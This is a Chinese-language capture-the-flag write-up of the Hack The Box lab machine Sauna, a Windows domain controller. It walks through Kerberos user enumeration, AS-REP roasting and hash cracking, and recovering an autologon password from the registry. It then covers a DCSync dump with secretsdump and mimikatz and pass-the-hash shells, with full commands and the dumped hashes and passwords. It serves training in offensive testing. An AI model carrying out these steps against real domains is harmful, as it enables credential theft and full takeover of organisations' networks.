靶机：10.10.10.175

kali：10.10.16.5

[HTB: Sauna | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/07/18/htb-sauna.html)



```bash
nmap -p- --min-rate 5555 10.10.10.175
nmap -p 53,80,88,135,139,389,445,464,593,3268,3269,5985 10.10.10.175 -sC -sV -oN nmap.txt
```

```
PORT     STATE    SERVICE          VERSION
53/tcp   open     domain           Simple DNS Plus
80/tcp   open     http             Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp   open     kerberos-sec     Microsoft Windows Kerberos (server time: 2023-09-16 09:54:46Z)
135/tcp  open     msrpc            Microsoft Windows RPC
139/tcp  open     netbios-ssn      Microsoft Windows netbios-ssn
389/tcp  open     ldap             Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http       Microsoft Windows RPC over HTTP 1.0
3268/tcp filtered globalcatLDAP
3269/tcp filtered globalcatLDAPssl
5985/tcp open     http             Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2023-09-16T09:55:30
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```



# 80 web

静态页面

<img src=".\图片\Snipaste_2023-09-16_10-58-00.png" alt="Snipaste_2023-09-16_10-58-00" style="zoom:80%;" />

收集一些人名字，作为用户名字典



# 445 smb

```bash
smbmap -H 10.10.10.175
smbclient -N -L //10.10.10.175
```

啥也没有



# LDAP 389

```bash
└─# ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
namingcontexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

更深入寻找

```bash
└─# ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```

得到 域名 `egotistical-bank.local`



# 53 dns

```bash
dig axfr @10.10.10.175 egotistical-bank.local
```

无收获

加入 hosts

```bash
echo '10.10.10.175 egotistical-bank.local' >> /etc/hosts
```



#  88 Kerberos

先尝试下用户名枚举

```bash
./Desktop/kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
```

还可以用之前web 80 端口收集到的用户名做字典

得到以下用户名存在

```
2020/02/15 14:41:59 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:46 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:42:54 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:43:21 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 14:47:43 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL
2020/02/15 16:01:56 >  [+] VALID USERNAME:       sauna@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 >  [+] VALID USERNAME:       FSmith@EGOTISTICAL-BANK.LOCAL
2020/02/16 03:13:54 >  [+] VALID USERNAME:       FSMITH@EGOTISTICAL-BANK.LOCAL
```

把它们整理成用户名字典

```bash
└─# cat user.list 
administrator
hsmith
fsmith
sauna
```



# AS-REP Roasting

寻找未开启域身份验证的用户，并导出它的hash

```bash
GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile user.list -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
```

然后 hashcat 破解 hash

```bash
└─# hashcat -h | grep Kerberos                                                                                                                                1 ⨯
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol
```

```bash
hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force
```

得到密码 

```
fsmith:Thestrokes23
```



# Evil-WinRM

```powershell
*Evil-WinRM* PS C:\Users\FSmith> type desktop/user.txt
d77cc39d8e2fbb8495cee29dfee47020
```



# 提权



## 读取注册表登录信息

可以上传 winpeas 来枚举  [Privilege Escalation Awesome Scripts Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

可以开启远程smb，远程执行

kali：

```
smbserver.py -username df -password df share . -smb2support
```

靶机：

```powershell
*Evil-WinRM* PS C:\> net use \\10.10.14.30\share /u:df df
The command completed successfully.
*Evil-WinRM* PS C:\> cd \\10.10.14.30\share\
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share>
*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\winPEAS.exe cmd fast > sauna_winpeas_fast
```



也可以手动查看

```powershell
*Evil-WinRM* PS C:\Users\FSmith> reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    EGOTISTICALBANK
    DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x156458a35
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultPassword    REG_SZ    Moneymakestheworldgoround!

HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\AlternateShells
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\GPExtensions
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\UserDefaults
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\software\microsoft\windows nt\currentversion\winlogon\VolatileUserMgrKey
```



还可以 powershell 查看

```powershell
*Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-item -path .
```



得到一组账号密码

```
svc_loanmanager:Moneymakestheworldgoround!
```



可以验证 `svc_loanmanager` 用户名信息

```powershell
*Evil-WinRM* PS C:\Users\FSmith> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
Administrator            FSmith                   Guest
HSmith                   krbtgt                   svc_loanmgr
```



winrm 登录

```bash
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```



## DCSync

原理就是类似 可以伪造域控，可导出域内所有账户的 hash



### bloodhound

上传

```bash
└─# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
                                        
Evil-WinRM shell v3.5 
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
                                        
Info: Establishing connection to remote endpoint 
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> ls
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> upload SharpHound.exe
```



运行后，kali 开启 smb 把 靶机上的 zip 文件传回 kali

```bash
└─# /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username zf1yolo -password zf1yolo
```

靶机运行：

```
net use \\10.10.16.5\share /u:zf1yolo zf1yolo
copy 20230912231407_BloodHound.zip \\10.10.16.5\share\
del 20230912231407_BloodHound.zip
net use /d \\10.10.16.5\share
```



导入 zip 分析

```bash
└─# neo4j restart
└─# bloodlound
```

<img src=".\图片\Snipaste_2023-09-16_12-01-53.png" alt="Snipaste_2023-09-16_12-01-53" style="zoom:80%;" />



### oxdf手法

My preferred way to do a DCSync attack is using `secretsdump.py`, which allows me to run DCSync attack from my Kali box, provided I can talk to the DC on TCP 445 and 135 and a high RPC port. This avoids fighting with AV, though it does create network traffic.

#### secretsdump

```bash
└─# secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:d9bbe450fb1c8732f57a5a1b3c852729:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
krbtgt:des-cbc-md5:c170d5dc3edfc1d9
EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
SAUNA$:aes256-cts-hmac-sha1-96:27da63a1b5045a3820c6109511c029181d46d09ba85f50b79c402be8dc7c1f1e
SAUNA$:aes128-cts-hmac-sha1-96:18207d9b0a48fae0df8cfdf901b769b6
SAUNA$:des-cbc-md5:a8803b0bda23a445
```



#### Mimikatz

```powershell
*Evil-WinRM* PS C:\programdata> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
```



### 横向手法

由于得到了 administrator 的 hash



```bash
wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.10.175 administrator@10.10.10.175
```



```bash
psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.10.175 administrator@10.10.10.175
```



```bash
evil-winrm -i 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```



```bash
└─# wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e' -dc-ip 10.10.10.175 administrator@10.10.10.175
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>cd users/administrator/desktop
C:\users\administrator\desktop>type root.txt
c1b3c7738999b9e925a53d942ae76efe
```
